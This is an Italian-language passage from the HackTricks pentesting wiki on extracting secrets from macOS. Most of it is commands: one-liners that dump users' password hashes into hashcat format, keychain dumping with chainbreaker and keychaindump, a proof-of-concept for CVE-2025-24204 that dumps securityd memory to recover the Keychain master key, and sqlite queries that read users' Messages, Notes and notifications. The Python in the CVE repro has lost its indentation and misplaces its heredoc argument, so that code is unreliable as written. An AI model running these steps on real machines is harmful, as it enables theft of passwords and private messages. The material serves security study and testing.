# macOS Posizioni sensibili & Daemons interessanti

{{#include ../../../banners/hacktricks-training.md}}

## Password

### Shadow Passwords

La shadow password è memorizzata insieme alla configurazione dell'utente in plist situati in **`/var/db/dslocal/nodes/Default/users/`**.\
La seguente oneliner può essere usata per estrarre **tutte le informazioni sugli utenti** (inclusi gli hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**this one**](https://github.com/octomagon/davegrohl.git) possono essere usati per trasformare l'hash in **hashcat** **format**.

Un'alternativa one-liner che esegue il dump dei creds di tutti i non-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Un altro modo per ottenere il `ShadowHashData` di un utente è usare `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Questo file è **utilizzato solo** quando il sistema è avviato in **modalità single-user** (quindi non molto frequentemente).

### Keychain Dump

Nota che quando si usa il binario security per **ottenere le password decriptate**, verranno mostrate diverse richieste che chiederanno all'utente di consentire questa operazione.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Basato su questo commento [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) sembra che questi strumenti non funzionino più in Big Sur.

### Panoramica di Keychaindump

Uno strumento chiamato **keychaindump** è stato sviluppato per estrarre password dai keychain di macOS, ma presenta limitazioni sulle versioni più recenti di macOS come Big Sur, come indicato in una [discussione](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). L'uso di **keychaindump** richiede che l'attaccante ottenga accesso e escali i privilegi a **root**. Lo strumento sfrutta il fatto che il keychain viene sbloccato di default al login dell'utente per comodità, permettendo alle applicazioni di accedervi senza richiedere ripetutamente la password dell'utente. Tuttavia, se un utente sceglie di bloccare il proprio keychain dopo ogni utilizzo, **keychaindump** diventa inefficace.

**Keychaindump** opera prendendo di mira un processo specifico chiamato **securityd**, descritto da Apple come un daemon per le operazioni di autorizzazione e crittografiche, cruciale per l'accesso al keychain. Il processo di estrazione prevede l'identificazione di una **Master Key** derivata dalla password di login dell'utente. Questa chiave è essenziale per leggere il file del keychain. Per individuare la **Master Key**, **keychaindump** scansiona l'heap di memoria di **securityd** usando il comando `vmmap`, cercando potenziali chiavi nelle aree contrassegnate come `MALLOC_TINY`. Il seguente comando viene usato per ispezionare queste posizioni di memoria:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Dopo aver identificato potenziali master key, **keychaindump** cerca negli heap un pattern specifico (`0x0000000000000018`) che indica un candidato per la master key. Sono necessari ulteriori passaggi, inclusa la deobfuscazione, per utilizzare quella master key, come indicato nel codice sorgente di **keychaindump**. Gli analisti che si concentrano su quest'area dovrebbero notare che i dati cruciali per decrittare il keychain sono memorizzati nella memoria del processo **securityd**. Un esempio di comando per eseguire **keychaindump** è:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) può essere usato per estrarre i seguenti tipi di informazioni da un OSX keychain in modo forense:

- Hashed Keychain password, suitable for cracking with [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Se viene fornita la keychain unlock password, una master key ottenuta usando [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), o un file di sblocco come SystemKey, Chainbreaker fornirà anche plaintext passwords.

Senza uno di questi metodi per sbloccare la Keychain, Chainbreaker mostrerà tutte le altre informazioni disponibili.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Estrai le chiavi del keychain (con le password) con SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (con passwords) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (con password) tramite memory dump**

[Segui questi passaggi](../index.html#dumping-memory-with-osxpmem) per eseguire un **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump delle chiavi del keychain (con password) usando la password dell'utente**

Se conosci la password dell'utente, puoi usarla per **esportare e decriptare i keychain che appartengono all'utente**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key via `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) è stato distribuito con `/usr/bin/gcore` che aveva l'entitlement **`com.apple.system-task-ports.read`**, quindi qualsiasi amministratore locale (o app firmata malevola) poteva dump **any process memory even with SIP/TCC enforced**. Dumping `securityd` leaks the **Keychain master key** in clear and lets you decrypt `login.keychain-db` without the user password.

**Quick repro on vulnerable builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Fornire la chiave esadecimale estratta a Chainbreaker (`--key <hex>`) per decrittare il login keychain. Apple ha rimosso l'entitlement in **macOS 15.3+**, quindi questo funziona solo su unpatched Sequoia builds o su sistemi che hanno mantenuto il vulnerable binary.

### kcpassword

Il file **kcpassword** contiene la **password di login dell'utente**, ma solo se il proprietario del sistema ha **abilitato l'accesso automatico**. Di conseguenza, l'utente verrà effettuato il login automaticamente senza che venga richiesta una password (cosa non molto sicura).

La password è memorizzata nel file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informazioni Interessanti nei Database

### Messaggi
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifiche

I dati delle notifiche si trovano in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

La maggior parte delle informazioni interessanti si troverà in **blob**. Quindi dovrai **estrarre** quel contenuto e **trasformarlo** in **leggibile** **dall'uomo** oppure usare **`strings`**. Per accedervi puoi eseguire:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Recenti problemi di privacy (NotificationCenter DB)

- In macOS **14.7–15.1** Apple ha memorizzato il contenuto dei banner nell'SQLite `db2/db` senza un adeguato oscuramento. Le CVE **CVE-2024-44292/44293/40838/54504** consentivano a qualsiasi utente locale di leggere il testo delle notifiche di altri utenti semplicemente aprendo il DB (nessun prompt TCC). Corretto in **15.2** spostando/bloccando il DB; sui sistemi più vecchi il percorso sopra citato continua a leak notifiche recenti e allegati.
- Il database è leggibile da tutti solo nelle build interessate, quindi quando si fa hunting su endpoint legacy copiatelo prima di aggiornare per preservare gli artefatti.

### Note

Le **note** degli utenti si trovano in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Preferenze

Su macOS le preferenze delle app si trovano in **`$HOME/Library/Preferences`** e su iOS si trovano in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Su macOS lo strumento CLI **`defaults`** può essere usato per **modificare il file Preferences**.

**`/usr/sbin/cfprefsd`** rivendica i servizi XPC `com.apple.cfprefsd.daemon` e `com.apple.cfprefsd.agent` e può essere chiamato per eseguire azioni come modificare le preferenze.

## OpenDirectory permissions.plist

Il file `/System/Library/OpenDirectory/permissions.plist` contiene le autorizzazioni applicate agli attributi del nodo ed è protetto da SIP.\
Questo file concede permessi a utenti specifici identificati tramite UUID (e non uid) in modo che possano accedere a informazioni sensibili specifiche come `ShadowHashData`, `HeimdalSRPKey` e `KerberosKeys`, tra le altre:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Notifiche di sistema

### Notifiche Darwin

Il principale daemon per le notifiche è **`/usr/sbin/notifyd`**. Per ricevere le notifiche, i client devono registrarsi attraverso la porta Mach `com.apple.system.notification_center` (verifica con `sudo lsmp -p <pid notifyd>`). Il daemon è configurabile tramite il file `/etc/notify.conf`.

I nomi usati per le notifiche sono notazioni DNS inverse univoche e quando una notifica viene inviata a uno di essi, il/i client che hanno indicato di poterla gestire la riceveranno.

È possibile ottenere il dump dello stato corrente (e vedere tutti i nomi) inviando il segnale SIGUSR2 al processo notifyd e leggendo il file generato: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Centro di Notifica Distribuito

Il **Centro di Notifica Distribuito** il cui binario principale è **`/usr/sbin/distnoted`**, è un altro modo per inviare notifiche. Espone alcuni servizi XPC e effettua dei controlli per cercare di verificare i client.

### Notifiche Push Apple (APN)

In questo caso, le applicazioni possono registrarsi per dei **topic**. Il client genererà un token contattando i server Apple tramite **`apsd`**.\
Poi, i provider avranno anch'essi generato un token e potranno connettersi ai server Apple per inviare messaggi ai client. Questi messaggi verranno ricevuti localmente da **`apsd`** che inoltrerà la notifica all'applicazione in attesa.

Le preferenze si trovano in `/Library/Preferences/com.apple.apsd.plist`.

Esiste un database locale dei messaggi situato in macOS in `/Library/Application\ Support/ApplePushService/aps.db` e in iOS in `/var/mobile/Library/ApplePushService`. Contiene 3 tabelle: `incoming_messages`, `outgoing_messages` e `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
È anche possibile ottenere informazioni sul daemon e sulle connessioni usando:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notifiche utente

Queste sono notifiche che l'utente dovrebbe vedere sullo schermo:

- **`CFUserNotification`**: Queste API forniscono un modo per mostrare sullo schermo un pop-up con un messaggio.
- **The Bulletin Board**: Mostra su iOS un banner che scompare e viene memorizzato nel Notification Center.
- **`NSUserNotificationCenter`**: Questo è il bulletin board di iOS in MacOS. Il database con le notifiche si trova in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
